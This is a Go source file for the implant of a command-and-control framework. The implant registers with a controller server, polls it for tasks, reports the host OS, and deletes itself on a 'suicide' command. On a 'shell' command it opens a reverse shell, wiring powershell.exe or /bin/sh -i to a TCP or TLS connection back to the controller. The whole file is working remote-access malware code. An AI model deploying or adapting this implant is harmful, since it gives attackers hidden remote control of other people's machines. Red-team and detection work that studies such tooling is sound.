package agent

import(
  "os"
  "io"
  "log"
  "fmt"
  "net"
  "time"
  "bytes"
  "os/exec"
  "net/http"
  "runtime"
  "crypto/tls"
  "io/ioutil"
  "crypto/x509"
  "github.com/alphamystic/odin/lib/utils"
  "github.com/alphamystic/odin/lib/penguins/zoo"
  "github.com/alphamystic/odin/wheagle/server/grpcapi"
)

func (iw *Implant) RunHTTPImplant(){
  //create a http/https cient
  var (
    err error
    url string
    client *http.Client
    output string
    work *grpcapi.Command
  )
  client = new(http.Client)
  if iw.Tls {
    client = &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
				},
			},
		}
    url = fmt.Sprintf("https://%s",iw.Address)
  } else {
    client = &http.Client{}
    url = fmt.Sprintf("http://%s",iw.Address)
  }
  //register
  regUrl := fmt.Sprintf("%s/auth/?msid=%s&mid=%s",url,iw.MothershipID,iw.ISession.SessionID)
  req,err := http.NewRequest("GET",regUrl,nil)
  if err != nil{
    log.Println(err);return
  }
  resp,err := client.Do(req)
  if err != nil{
    fmt.Println("[-]  Error sending request: ",err);return
  }
  if resp.StatusCode != http.StatusOK {
		fmt.Println("Server returned non-OK status code:", resp.Status)
    fmt.Println(resp.Body)
		return
	}
  cookie := resp.Header.Get("Coockie")
  resp.Body.Close();time.Sleep(5 * time.Second)
  START:
  // get work
  workUrl := url+"/getwork"
  outUrl := url+"/output"
  if req,err = http.NewRequest("GET",workUrl,nil); err != nil {
    fmt.Println("[-]  Error getting work: ",err);goto START
  }
  resp,err = client.Do(req)
  if err != nil {
    fmt.Println("[-]  Error sending request: ",err);return
  }
  if resp.StatusCode == http.StatusNoContent {
    time.Sleep(5 * time.Second)
    goto START
  }
  if resp.StatusCode != http.StatusOK {
		fmt.Println("Server returned non-OK status code for POST request:", resp.Status)
    time.Sleep(5 * time.Second)
		goto START
	}
  // switch the work
  body,err := ioutil.ReadAll(resp.Body)
  if err != nil {
    utils.Logerror(err);return
  }
  resp.Body.Close()
  work,err = grpcapi.WorkDecode(body)
  if err != nil{
    time.Sleep(5 * time.Second);goto START
  }
  switch work.In {
  case "":
    time.Sleep(5 * time.Second)
    goto START
  case "No Work.":
    time.Sleep(5 * time.Second)
    goto START
  case "getos":
    output = runtime.GOOS
    work.Out += output
    iw.HTTPSendOutput(cookie,outUrl,work)
    goto START
  case "upload":
  case "download":
  case "shell":
    var conn net.Conn
    if iw.Tls{
      roots := x509.NewCertPool()
      ok := roots.AppendCertsFromPEM(iw.RootPem)
      if !ok {
        log.Println("Error appending cert to pool")
        return
      }
      conn,err = tls.Dial("tcp",iw.Address, &tls.Config{
        RootCAs: roots,
      })
      if err != nil{
        log.Println(err);goto START
      }
    } else {
      conn,err = net.Dial("tcp",iw.Address)
      if err != nil{
        log.Println(err);goto START
      }
    }
    // change thsi to check protocol for tcp/tls
    conn,_ = net.Dial("tcp",iw.Address)
    Interactive(conn)
  case "suicide":
    output = "Initiating kill chain..........."
    work.Out += output
    iw.HTTPSendOutput(cookie,outUrl,work)
    _ = os.Remove(os.Args[0])
    os.Exit(0)
  default:
    work.Out += output
    iw.HTTPSendOutput(cookie,outUrl,work)
    goto START
  }
}

// does not return that way if the post request/encoding fais the work still remains in the pool.
func (iw *Implant) HTTPSendOutput(cookie, outUrl string, cmd *grpcapi.Command) {
	data, err := grpcapi.WorkEncode(cmd)
	if err != nil {
		return
	}
	var count int
  BEGIN:
	req, err := http.NewRequest("POST", outUrl, bytes.NewReader(data))
	if err != nil {
    utils.Logerror(fmt.Errorf("Failed to create POST request: %s", err))
		return
	}
	// Set the cookie in the request header
	req.Header.Set("Cookie", cookie)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
    utils.Logerror(fmt.Errorf("Failed to make POST request: %s", err))
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		if count >= 3 {
      utils.Logerror(fmt.Errorf("Error sending output: %s with statuscode %s",resp.Body,resp.StatusCode))
			return
		}
		count++
		goto BEGIN
	}
	return
}

func Interactive(conn net.Conn){
  rp, wp := io.Pipe()
  var cmd *exec.Cmd
  if runtime.GOOS == "windows"{
    cmd = exec.Command("powershell.exe")
  } else {
    cmd = exec.Command("/bin/sh","-i")
  }
  zoo.CommandExecuter(cmd)
  cmd.Stdin = conn
  cmd.Stdout = wp
  go io.Copy(conn,rp)
  cmd.Run()
}
